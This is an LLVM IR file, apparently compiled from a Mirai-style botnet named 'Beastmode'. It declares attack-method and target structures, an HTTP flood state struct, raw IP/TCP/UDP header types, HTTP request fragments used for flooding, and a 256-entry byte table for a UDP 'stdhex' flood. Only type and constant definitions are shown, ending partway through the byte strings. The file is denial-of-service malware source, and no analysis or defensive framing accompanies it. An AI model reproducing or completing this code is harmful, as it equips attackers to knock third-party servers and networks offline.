; ModuleID = 'host/ir_sub/Beastmode.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@attack_udp_stdhex.leon_hex = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.1.16 = private unnamed_addr constant [2 x i8] c"\01\00", align 1
@.str.2.17 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.3.18 = private unnamed_addr constant [2 x i8] c"\03\00", align 1
@.str.4.19 = private unnamed_addr constant [2 x i8] c"\04\00", align 1
@.str.5.20 = private unnamed_addr constant [2 x i8] c"\05\00", align 1
@.str.6.21 = private unnamed_addr constant [2 x i8] c"\06\00", align 1
@.str.7.22 = private unnamed_addr constant [2 x i8] c"\07\00", align 1
@.str.8.23 = private unnamed_addr constant [2 x i8] c"\08\00", align 1
@.str.9.24 = private unnamed_addr constant [2 x i8] c"\09\00", align 1
@.str.10.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.11.26 = private unnamed_addr constant [2 x i8] c"\0B\00", align 1
@.str.12.27 = private unnamed_addr constant [2 x i8] c"\0C\00", align 1
@.str.13.28 = private unnamed_addr constant [2 x i8] c"\0D\00", align 1
@.str.14.29 = private unnamed_addr constant [2 x i8] c"\0E\00", align 1
@.str.15.30 = private unnamed_addr constant [2 x i8] c"\0F\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\10\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\11\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\12\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\14\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\15\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"\16\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\17\00", align 1
@.str.24 = private unnamed_addr constant [2 x i8] c"\18\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\19\00", align 1
@.str.26 = private unnamed_addr constant [2 x i8] c"\1A\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"\1B\00", align 1
@.str.28 = private unnamed_addr constant [2 x i8] c"\1C\00", align 1
@.str.29 = private unnamed_addr constant [2 x i8] c"\1D\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"\1E\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"\1F\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"\22\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] c"%\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"&\00", align 1
@.str.39 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"(\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c")\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"*\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"+\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@.str.49 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.50 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.51 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.54 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.56 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.58 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.59 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c"<\00", align 1
@.str.61 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.62 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.63 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@.str.65 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"B\00", align 1
@.str.67 = private unnamed_addr constant [2 x i8] c"C\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"D\00", align 1
